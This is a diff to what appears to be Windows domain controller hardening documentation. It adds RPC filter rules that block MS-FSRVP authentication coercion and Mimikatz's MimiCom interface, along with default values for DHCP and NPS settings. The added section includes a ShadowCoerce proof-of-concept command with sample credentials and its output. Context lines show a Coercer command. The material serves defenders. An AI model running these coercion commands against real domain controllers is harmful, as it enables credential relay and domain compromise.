@@ -611,7 +611,7 @@ coercer coerce --username john --password 'Pa$$w0rd' --domain 'contoso.com' --ta
 [+] All done! Bye Bye!
 ```
 
-The primary solution to this vulnerability is to disable the `Print Spooler` service on domain controllers. As an alternative, the following sequence of `netsh.exe` commands will block MS-RPRN connections over named pipes:
+The primary solution to this vulnerability, commonly known as PrinterBug, is to disable the `Print Spooler` service on domain controllers. As an alternative, the following sequence of `netsh.exe` commands will block MS-RPRN connections over named pipes:
 
 ```txt
 rpc filter
@@ -683,6 +683,49 @@ add condition field=if_uuid matchtype=equal data=df1941c5-fe89-4e79-bf10-463657a
 add filter
 ```
 
+#### \[MS-FSRVP\]: File Server Remote VSS Protocol
+
+> [!NOTE]
+> The MS-FSVRP part needs expansion.
+
+[\[MS-FSRVP\]: File Server Remote VSS Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/dae107ec-8198-4778-a950-faa7edad125b)
+
+[a8e0653c-2744-4389-a61d-7373df8b2292](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/92d20000-dcbc-4ec1-bf10-9a38c828436d)
+
+[\\PIPE\\FssagentRpc](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/c504c88e-3248-418f-8d83-22ec8f008816)
+
+File Server VSS Agent Service
+
+[ShadowCoerce](https://github.com/ShutdownRepo/ShadowCoerce)
+
+```shell
+python3 shadowcoerce.py -d contoso -u john -p 'Pa$$w0rd' hacker-pc dc01 
+```
+
+```txt
+MS-FSRVP authentication coercion PoC
+
+[*] Connecting to ncacn_np:dc01[\PIPE\FssagentRpc]
+[*] Connected!
+[*] Binding to a8e0653c-2744-4389-a61d-7373df8b2292
+[*] Successfully bound!
+[*] Sending IsPathSupported!
+[*] Attack may of may not have worked, check your listener...
+```
+
+```txt
+rpc filter
+
+add rule layer=um actiontype=permit filterkey=869a3c6c-60dd-4558-a58b-8d9e86b0da5f
+add condition field=if_uuid matchtype=equal data=a8e0653c-2744-4389-a61d-7373df8b2292
+add condition field=remote_user_token matchtype=equal data=D:(A;;CC;;;DA)
+add filter
+
+add rule layer=um actiontype=block filterkey=4bce314a-d956-41cf-86f1-75067362cae6
+add condition field=if_uuid matchtype=equal data=a8e0653c-2744-4389-a61d-7373df8b2292
+add filter
+```
+
 #### \[MS-DNSP\]: Domain Name Service (DNS) Server Management Protocol
 
 The [\[MS-DNSP\]: Domain Name Service (DNS) Server Management Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/f97756c9-3783-428b-9451-b376f877319a) with UUID [50ABC2A4-574D-40B3-9D66-EE4FD5FBA076](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/5093503c-687e-4376-9127-50504908fb91) is used by the built-in `dnsmgmt.msc` console and the `dnscmd.exe` utility to remotely manage DNS servers:
@@ -745,6 +788,19 @@ Although the output of the tool might suggest that WMI traffic can be tunnelled 
 
 > [!IMPORTANT]
 > System Center Configuration Manager (SCCM) agent will not work properly if these ASR rules are enabled.
+
+#### Malicious C2 Protocols and Backdoors
+
+Some malicious tools can use the RPC protocol as a Command and Control (C2) channel. One such example is the infamous `Mimikatz` tool, which can be remotely controlled through the MimiCom interface with UUID [17FC11E9-C258-4B8D-8D07-2F4125156244](https://github.com/gentilkiwi/mimikatz/blob/master/mimicom.idl). One could of course block this interface using the following RPC filter:
+
+```txt
+rpc filter
+add rule layer=um actiontype=block filterkey=644291ca-9530-4066-b654-e7b838ebdc06
+add condition field=if_uuid matchtype=equal data=17FC11E9-C258-4B8D-8D07-2F4125156244
+add filter
+```
+
+Unfortunately, this approach would be futile, as serious adversaries would never use a well-known protocol identifier.
 
 #### Further Protocol Considerations
 
@@ -1689,9 +1745,31 @@ Possible values: true / false
 
 ### EnableDhcpServer
 
+```yaml
+Type: Boolean
+Required: false
+Default value: true
+Recommended value: false
+Possible values: true / false
+```
+
 ### EnableNPS
 
+```yaml
+Type: Boolean
+Required: false
+Default value: true
+Recommended value: false
+Possible values: true / false
+```
+
 ### RadiusClientAddresses
+
+```yaml
+Type: String[]
+Required: false
+Default value: [ "Any" ]
+```
 
 ### EnableNetworkProtection
 
